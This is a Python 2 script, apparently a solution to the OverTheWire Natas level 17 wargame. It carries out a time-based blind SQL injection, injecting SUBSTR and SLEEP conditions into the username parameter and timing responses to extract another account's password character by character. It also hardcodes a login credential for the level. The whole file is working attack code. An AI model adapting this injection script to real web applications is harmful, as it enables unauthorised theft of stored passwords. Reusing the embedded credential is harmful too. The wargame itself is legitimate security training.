#!/usr/bin/python

import urllib2
from datetime import datetime
import base64

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

encoded = base64.b64encode('{}:{}'.format(username, password))
auth_head = 'Basic {}'.format(encoded)
alphanumerics = map(chr, range(65, 91) + range(97,123) + range(48, 58))

def buildurl(char, start):
    return "http://natas17.natas.labs.overthewire.org/?username=natas18%22%20AND%20ASCII(SUBSTR(password,"+str(start)+",1))=ASCII(%22"+str(char)+"%22)%20AND%20SLEEP(2)%20AND%20%22a%22=%22a&debug=true"

def validate(char, start):
    req = urllib2.Request(buildurl(char, start))
    req.add_header("Authorization", auth_head)
    t1 = datetime.now()
    response = urllib2.urlopen(req).read()
    t2 = datetime.now()    
    return (t2 - t1).seconds > 1

password = ""

while len(password) < 32:
    print password
    for char in alphanumerics:
        if validate(char, len(password)+1):
            password = password + char
            break

print password
print "Done."

